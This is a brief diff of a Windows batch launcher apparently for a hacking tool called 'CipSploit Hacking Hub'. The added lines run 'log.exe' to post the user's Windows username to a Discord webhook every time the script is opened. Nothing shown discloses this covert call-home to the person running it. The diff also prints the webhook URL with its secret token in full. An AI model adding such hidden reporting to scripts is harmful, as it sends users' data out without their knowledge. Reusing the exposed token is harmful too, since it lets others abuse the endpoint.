@@ -1,6 +1,8 @@
-﻿set VipVersion=1.8
+set VipVersion=1.8
 setlocal delayexpansion
-title CipSploit hub
+title CipSploit Hacking Hub
+cd Downloads/XDevFolder/AC
+"log.exe" "https://discordapp.com/api/webhooks/634090778020544535/YnLrdu_R2iIq29A4wUBq7O300EkRyYRGcYVzLicCxlzJThlm_RAQd7hKDVfRmo4lRxT8" " %USERNAME% Oppened CipsPloit" "CipSploit Security"
 cls
 :FileStart
 @echo off
